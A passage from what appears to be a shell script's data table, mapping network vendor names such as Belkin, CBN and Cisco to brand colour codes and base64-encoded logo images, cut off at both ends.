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'
										["Belkin"]='#0057D8 #94CAE4 #D6D6D6 data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNy4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB2aWV3Qm94PSIwIDAgNjAwIDE2My41IiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCA2MDAgMTYzLjUiIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPHBhdGggZmlsbD0iIzIzMUYyMCIgZD0iTTU3My4xLDEwOS4zdjM5LjhoLTE5LjJsMC0zOS44YzAtMTAuOC00LjItMTcuMi0xNC43LTE3LjJzLTE0LjcsNi41LTE0LjcsMTcuMnYzOS44aC0xOS4ydi0zOS44DQoJYzAtMjIuMywxMS4zLTM1LDM0LTM1QzU2MS44LDc0LjMsNTczLjEsODYuOCw1NzMuMSwxMDkuMyIvPg0KPHJlY3QgeD0iMzY2LjciIHk9IjQ5LjIiIGZpbGw9IiMyMzFGMjAiIHdpZHRoPSIxOS4yIiBoZWlnaHQ9IjEwMCIvPg0KPHBvbHlnb24gZmlsbD0iIzIzMUYyMCIgcG9pbnRzPSI0NjYuMyw3Ni45IDQ0NC4yLDc2LjkgNDE4LjMsMTA4LjkgNDE4LjMsNDkuMyAzOTkuMSw0OS4zIDM5OS4xLDE0OS4yIDQxOC4zLDE0OS4yIDQxOC4zLDExNC42IA0KCTQ0NC4yLDE0OS4yIDQ2Ny42LDE0OS4yIDQzNy43LDExMC4zICIvPg0KPHJlY3QgeD0iNDc0LjkiIHk9Ijc2LjkiIGZpbGw9IiMyMzFGMjAiIHdpZHRoPSIxOS4yIiBoZWlnaHQ9IjcyLjQiLz4NCjxwYXRoIGZpbGw9IiMyMzFGMjAiIGQ9Ik03Ni40LDMzLjhjOS40LDAsMTYuOS03LjYsMTYuOS0xNi45QzkzLjMsNy42LDg1LjgsMCw3Ni40LDBjLTkuMywwLTE2LjksNy42LTE2LjksMTYuOQ0KCUM1OS41LDI2LjMsNjcuMSwzMy44LDc2LjQsMzMuOCIvPg0KPHBhdGggZmlsbD0iIzIzMUYyMCIgZD0iTTYxLjQsNTAuN2MtNi4yLDAtMTEuMyw1LjEtMTEuMywxMS4zYzAsNi4yLDUsMTEuMywxMS4zLDExLjNjNi4yLDAsMTEuMy01LDExLjMtMTEuMw0KCUM3Mi43LDU1LjgsNjcuNiw1MC43LDYxLjQsNTAuNyIvPg0KPHBhdGggZmlsbD0iIzIzMUYyMCIgZD0iTTExLjMsNDUuN0M1LDQ1LjcsMCw1MC44LDAsNTdjMCw2LjIsNSwxMS4zLDExLjMsMTEuM2M2LjMsMCwxMS4zLTUuMSwxMS4zLTExLjMNCglDMjIuNSw1MC44LDE3LjUsNDUuNywxMS4zLDQ1LjciLz4NCjxwYXRoIGZpbGw9IiMyMzFGMjAiIGQ9Ik04MC4yLDYyYzAsNi4yLDUsMTEuMywxMS4zLDExLjNjNi4yLDAsMTEuMy01LDExLjMtMTEuM2MwLTYuMi01LTExLjMtMTEuMy0xMS4zDQoJQzg1LjIsNTAuNyw4MC4yLDU1LjgsODAuMiw2MiIvPg0KPHBhdGggZmlsbD0iIzIzMUYyMCIgZD0iTTE0MS42LDQ1LjdjLTYuMiwwLTExLjMsNS0xMS4zLDExLjNjMCw2LjIsNSwxMS4zLDExLjMsMTEuM2M2LjIsMCwxMS4zLTUuMSwxMS4zLTExLjMNCglDMTUyLjksNTAuOCwxNDcuOCw0NS43LDE0MS42LDQ1LjciLz4NCjxwYXRoIGZpbGw9IiMyMzFGMjAiIGQ9Ik02MS40LDgwLjhjLTYuMiwwLTExLjMsNS4xLTExLjMsMTEuM2MwLDYuMiw1LDExLjMsMTEuMywxMS4zYzYuMiwwLDExLjMtNS4xLDExLjMtMTEuMw0KCUM3Mi43LDg1LjksNjcuNiw4MC44LDYxLjQsODAuOCIvPg0KPHBhdGggZmlsbD0iIzIzMUYyMCIgZD0iTTEwMi43LDkyLjFjMC02LjItNS0xMS4zLTExLjMtMTEuM2MtNi4yLDAtMTEuMyw1LjEtMTEuMywxMS4zYzAsNi4yLDUsMTEuMywxMS4zLDExLjMNCglDOTcuNywxMDMuNCwxMDIuNyw5OC4zLDEwMi43LDkyLjEiLz4NCjxwYXRoIGZpbGw9IiMyMzFGMjAiIGQ9Ik00Ni40LDE0MWMtNi4yLDAtMTEuMyw1LjEtMTEuMywxMS4zYzAsNi4yLDUuMSwxMS4zLDExLjMsMTEuM2M2LjIsMCwxMS4zLTUsMTEuMy0xMS4zDQoJQzU3LjYsMTQ2LDUyLjYsMTQxLDQ2LjQsMTQxIi8+DQo8cGF0aCBmaWxsPSIjMjMxRjIwIiBkPSJNMTA2LjUsMTQxYy02LjIsMC0xMS4zLDUuMS0xMS4zLDExLjNjMCw2LjIsNS4xLDExLjMsMTEuMywxMS4zYzYuMiwwLDExLjMtNSwxMS4zLTExLjMNCglDMTE3LjgsMTQ2LDExMi43LDE0MSwxMDYuNSwxNDEiLz4NCjxwYXRoIGZpbGw9IiMyMzFGMjAiIGQ9Ik00ODQuNSw0NS42Yy02LjEsMC0xMS4xLDUtMTEuMSwxMS4xYzAsNi4xLDUsMTEuMSwxMS4xLDExLjFjNi4xLDAsMTEuMS01LDExLjEtMTEuMQ0KCUM0OTUuNiw1MC42LDQ5MC42LDQ1LjYsNDg0LjUsNDUuNiIvPg0KPHBhdGggZmlsbD0iIzIzMUYyMCIgZD0iTTQ4NC41LDQ1LjZjLTYuMSwwLTExLjEsNS0xMS4xLDExLjFjMCw2LjEsNSwxMS4xLDExLjEsMTEuMWM2LjEsMCwxMS4xLTUsMTEuMS0xMS4xDQoJQzQ5NS42LDUwLjYsNDkwLjYsNDUuNiw0ODQuNSw0NS42Ii8+DQo8cG9seWdvbiBmaWxsPSIjMjMxRjIwIiBwb2ludHM9IjU4OS40LDE0MS44IDU4Ni42LDE0MS44IDU4Ni42LDE0OS4yIDU4NS4yLDE0OS4yIDU4NS4yLDE0MS44IDU4Mi40LDE0MS44IDU4Mi40LDE0MC41IDU4OS40LDE0MC41IA0KCSIvPg0KPHBvbHlnb24gZmlsbD0iIzIzMUYyMCIgcG9pbnRzPSI2MDAsMTQwLjUgNTk4LjMsMTQwLjUgNTk1LjMsMTQ3IDU5NS4yLDE0NyA1OTIuMywxNDAuNSA1OTAuNiwxNDAuNSA1OTAuNiwxNDkuMiA1OTEuOSwxNDkuMiANCgk1OTEuOSwxNDIuOSA1OTIsMTQyLjkgNTk0LjgsMTQ5LjIgNTk1LjYsMTQ5LjIgNTk4LjUsMTQyLjkgNTk4LjYsMTQyLjkgNTk4LjYsMTQ5LjIgNjAwLDE0OS4yICIvPg0KPHBhdGggZmlsbD0iIzIzMUYyMCIgZD0iTTI0MC40LDc0LjRjLTEwLjYsMC0xOC42LDQuOC0yMi42LDkuOVY0OC4zaC0yMHY2NC4yYzAsMjIuOCwxNS45LDM4LjcsMzguNSwzOC43DQoJYzIyLjYsMCwzOC42LTE1LjgsMzguNi0zOC40QzI3NC45LDg5LjksMjYxLjEsNzQuNCwyNDAuNCw3NC40eiBNMjM2LjQsMTMzLjRjLTEwLjksMC0xOS4yLTguOS0xOS4yLTIwLjZjMC0xMS43LDguMy0yMC42LDE5LjItMjAuNg0KCWMxMC45LDAsMTkuMSw4LjksMTkuMSwyMC42QzI1NS42LDEyNC42LDI0Ny4zLDEzMy40LDIzNi40LDEzMy40eiIvPg0KPHBhdGggZmlsbD0iIzIzMUYyMCIgZD0iTTM1Ni42LDExMy45YzAtMjQuOS0xMy42LTM5LjYtMzYuNC0zOS42Yy0yMS42LDAtMzcuOSwxNi44LTM3LjksMzkuMWMwLDIyLjYsMTUuNiwzNy44LDM5LDM3LjgNCgljMTMuOCwwLDIzLjMtNS4xLDI4LjktOS42bC05LjgtMTMuM2MtNS4zLDQuNi0xMS42LDYuNS0xOS4yLDYuNWMtMTAuMywwLTE4LjYtNi41LTE5LjYtMTUuNWg1NC43DQoJQzM1Ni41LDExOC4zLDM1Ni42LDExNS41LDM1Ni42LDExMy45eiBNMzAxLjgsMTA2LjNjMS4zLTksNy40LTE2LDE3LjgtMTZjMTAuNSwwLDE2LjMsNywxNy42LDE2SDMwMS44eiIvPg0KPC9zdmc+DQo='
										["CBN"]='#D1D1D1 #008536 #696969 data:image/png;base64,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'
										["Cisco"]='#5B5B5B #8AB8E6 #D7D7D7 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANgAAAByCAYAAAAxpx9lAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QA/wD/AP+gvaeTAAAAB3RJTUUH4gcQFhY4WVBJLQAAFZxJREFUeNrtnXt8lMW5x3/P+867IVmCIkUhXAKE7AZoLXhpK6JCK1Zb6anHGikgyYbQtJ+2tPbTntYLNcdqrb2cY/EgRclugqIt6seenk+t2lYOKvpBwVZrwl64JQiCVe5Ednfe9zl/hNMKmuzs/cJ8/8xO3pln5vnNPDPvzLyEUmT1a+OFXfYQyDgPDrtAdJRgPxHvrmtGK0lo8kcrC2tsuI0J14DhhkExsLNZ2q75aJ7QXWrmUsk14P2hC00LGwiwPuTX3dLtmYB6imlPz4e41g0SY6u2gVB16k8MxG0yL0LjxM2lZLJRam0oXPR0P+ICgFHiaORR7el5aptxox77MHGd6OktwfbTpWZzSQmsbFXwSjAPHSgNE1+lXT0/sON8NkGSYWWBv83WAitQbMuYqRATW1i76yzt7jlm7a6ziEgkbEO4Pq0FVrA9JFcoJTwcr9Qen2MU65wBtxaYRqPRAtNotMA0Gi0wjUajBabRaIFpNFpgGo1GC0yj0QLTaLTANBqNFphGU1SIvOTaFqyyTB4Zd6y30TRxV1HXYCsbrrFb6xgYFGc7gkV1R4ranrZgpUVmLQl+L7a9NoRWcoraHv/WMZYRPztu01tYVLenpEcwlz8yWQSC/ysM2s1sbBJk9wh/8EWrIzKtGNvODIRuENXhHoecTiZnszDoHTMQuh/LOwcXo7DM9tADwqB3mJzNjs1dYly42/QHFxRj21j+yHkiEHpJkN3DbGwSBu0WgfA61+rwpJIUmCsQqnOIXwDospN+ILqIHed5KxCeWlQNGAh+i4DVAEa930wCFoty8xksi5QVjTGBHYOEQc8QoxmA6x9/Z4wmogetQPibxSYuJuc5AJ86+Ree6djYUNaxxVNyAnNA9wD9HoZ0Mzv3FU0LPtg1kkE/6fd3oousIdxSNA7Jsa990Bnf55bguxHoHFEs9jA5y9HvsRceatvGPaUlsMCOMwEe+KQq0UXoCI0qCoe0xRwAgwZsZOb64nFIfClBknKLxdXFMucaqLPo8zVcgZXbzigZgbnM+EiVvCzHGFMUDulwwo6AwGOKRWAEHp3QZqAo7LGIVTpp01VuV5XOCBaTplpPaptF4ZEGG4ltoaJ5BaJUVgWbC8MWRR9S9MmimYNpNKcjWmAajRaYRqMFptFotMA0Gi0wjaYkOHmz76quamGIWjL5cHzHnlfROkt/iaRQWLltrOWKXwMYiMfMJ9BS06MrpUBoXSessaPOZ6BSOjKC5sndJwtsVVe1MM02AJ8BGOwAorpqL/vD37GbPI/oGswjyzsHiwpzPSDPYxAAhnDJexAIbpa99kx8fcpRXUn5wwyE5x